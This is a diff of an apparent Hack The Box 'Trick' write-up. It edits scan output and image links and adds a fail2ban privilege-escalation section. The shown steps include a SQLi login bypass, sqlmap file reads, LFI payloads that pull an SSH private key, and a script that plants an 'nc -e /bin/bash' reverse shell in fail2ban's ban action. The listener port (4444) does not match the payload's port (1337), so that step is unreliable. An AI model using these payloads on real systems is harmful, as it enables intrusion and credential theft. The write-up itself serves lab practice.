@@ -24,27 +24,6 @@ PORT      STATE    SERVICE        VERSION
 |_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
 |_http-title: Coming Soon - Start Bootstrap Theme
 |_http-server-header: nginx/1.14.2
-99/tcp    filtered metagram
-100/tcp   filtered newacct
-587/tcp   filtered submission
-720/tcp   filtered unknown
-765/tcp   filtered webster
-992/tcp   filtered telnets
-993/tcp   filtered imaps
-1025/tcp  filtered NFS-or-IIS
-1030/tcp  filtered iad1
-1094/tcp  filtered rootd
-1100/tcp  filtered mctp
-1666/tcp  filtered netview-aix-6
-2607/tcp  filtered connection
-3367/tcp  filtered satvid-datalnk
-4446/tcp  filtered n1-fwp
-5101/tcp  filtered admdog
-6106/tcp  filtered isdninfo
-8652/tcp  filtered unknown
-9595/tcp  filtered pds
-25735/tcp filtered unknown
-61532/tcp filtered unknown
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
@@ -69,7 +48,7 @@ Notes:
 
 #### Visual Inspection
 
-<figure><img src="../../../.gitbook/assets/image (28) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (28) (2).png" alt=""><figcaption></figcaption></figure>
 
 #### ffuf Subdomain Enumeration
 
@@ -170,7 +149,7 @@ root.trick.htb
 
 #### Visual Inspection
 
-<figure><img src="../../../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (61) (1).png" alt=""><figcaption></figcaption></figure>
 
 <mark style="color:yellow;">We are able to perform a SQLi authentication bypass using a classic SQLi payload in both fields:</mark>
 
@@ -180,7 +159,7 @@ root.trick.htb
 
 * We now have access to the administrator's page
 
-<figure><img src="../../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>
 
 Upon going to the users tab, you can modify the password for the Administrator account so we can freely authenticate as the admin.
 
@@ -216,7 +195,7 @@ ffuf -c -u http://preprod-payroll.trick.htb/ -w /usr/share/amass/wordlists/subdo
 
 #### Visual Inspection
 
-<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>
 
 * It appears to be a very basic site, not much is going on here
 * However, if we go to a different page such as Services, we can see that the URL bar appends `index.php?page=` at the top
@@ -231,7 +210,7 @@ Let's find out why this is happening:
 sqlmap -r login.req --risk 3 --level 5 --technique=BEU --batch --privilege --file-read=/var/www/market/index.php --threads 10
 ```
 
-<figure><img src="../../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 In here, we see that PHP is using .str\_replace for ../ which is impacting our LFI attack. However, what if we stack our ../'s and we try again?
 
@@ -245,7 +224,7 @@ Upon finding source code for the PHP code for the website from SQLi, we can expl
 http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//etc/passwd
 ```
 
-<figure><img src="../../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>
 
 Grabbing Michael's SSH Private Key:
 
@@ -253,7 +232,7 @@ Grabbing Michael's SSH Private Key:
 http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//home/michael/.ssh/id_rsa
 ```
 
-<figure><img src="../../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>
 
 * After putting the private key in an id\_rsa file, we need to `chmod 600` this file and authenticate to the server via SSH
 
@@ -263,13 +242,60 @@ http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//home/m
 ssh -i id_rsa michael@trick.htb
 ```
 
-<figure><img src="../../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
 ### Local enumeration
 
+After transferring linpeas to the victim, I am now going through it to analyze the results:
+
+* Nothing of interest was found
+
 ### PrivEsc vector
 
-## Proofs
+`sudo -l`:
 
+```
+Matching Defaults entries for michael on trick:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User michael may run the following commands on trick:
+    (root) NOPASSWD: /etc/init.d/fail2ban restart
+```
+
+* This method looks familiar
+
+{% embed url="https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/" %}
+
+Using this article, we can put together methodology that allows us to script this exploitation process:
+
+getpwned.sh:
+
+```
+mv /etc/fail2ban/action.d/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf.bak
+cp /etc/fail2ban/action.d/iptables-multiport.conf.bak /etc/fail2ban/action.d/iptables-multiport.conf
+sed -i -e "s/actionban = .*/actionban = nc \-e \/bin\/bash 10.10.14.38 1337/g" /etc/fail2ban/action.d/iptables-multiport.conf
+chmod 777 /etc/fail2ban/action.d/iptables-multiport.conf
+
+sudo /etc/init.d/fail2ban restart
+```
+
+Start nc listener:
+
+```
+nc -lnvp 4444
+```
+
+Invoke the ban with CME:
+
+```
+crackmapexec -t 50 ssh trick.htb -u hacker -p /usr/share/wordlists/rockyou.txt
+```
+
+* You want to get banned to invoke the fail2ban banning feature on yourself
+* This process can be sped up through scripting and CME
+
+## Proof
+
+<figure><img src="../../../.gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>
